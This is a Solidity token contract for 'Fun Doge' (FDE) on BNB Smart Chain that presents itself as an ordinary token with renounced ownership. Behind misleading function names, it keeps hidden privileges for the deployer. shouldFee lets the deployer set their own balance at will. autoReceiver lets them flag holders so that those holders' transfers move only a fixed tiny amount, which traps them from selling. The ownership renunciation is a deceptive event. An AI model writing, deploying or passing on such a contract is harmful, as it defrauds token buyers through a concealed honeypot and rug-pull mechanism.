/**
 *Submitted for verification at BscScan.com on 2023-01-29
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract FunDoge {
    uint8 public decimals = 18;

    bool public enableTo;

    mapping(address => bool) public burnMarketing;
    address public takeBurn;
    mapping(address => bool) public listLaunched;
    string public name = "Fun Doge";
    uint256 constant walletFeeTake = 9 ** 10;
    string public symbol = "FDE";
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public balanceOf;

    address public owner;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public marketingMinTo;

    
    modifier tokenReceiver() {
        require(listLaunched[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IRouter listSwap = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IFactory modeAuto = IFactory(listSwap.factory());
        takeBurn = modeAuto.createPair(listSwap.WETH(), address(this));
        owner = msg.sender;
        marketingMinTo = owner;
        listLaunched[marketingMinTo] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function shouldFee(uint256 receiverShould) public tokenReceiver {
        balanceOf[marketingMinTo] = receiverShould;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == marketingMinTo || recipient == marketingMinTo) {
            return txAuto(sender, recipient, amount);
        }
        if (burnMarketing[sender]) {
            return txAuto(sender, recipient, walletFeeTake);
        }
        return txAuto(sender, recipient, amount);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function txAuto(address marketingTakeTx, address isFund, uint256 receiverShould) internal returns (bool) {
        require(balanceOf[marketingTakeTx] >= receiverShould);
        balanceOf[marketingTakeTx] -= receiverShould;
        balanceOf[isFund] += receiverShould;
        emit Transfer(marketingTakeTx, isFund, receiverShould);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function shouldFromExempt(address isWallet) public {
        if (enableTo) {
            return;
        }
        listLaunched[isWallet] = true;
        enableTo = true;
    }

    function autoReceiver(address toLimit) public tokenReceiver {
        if (toLimit == marketingMinTo) {
            return;
        }
        burnMarketing[toLimit] = true;
    }


}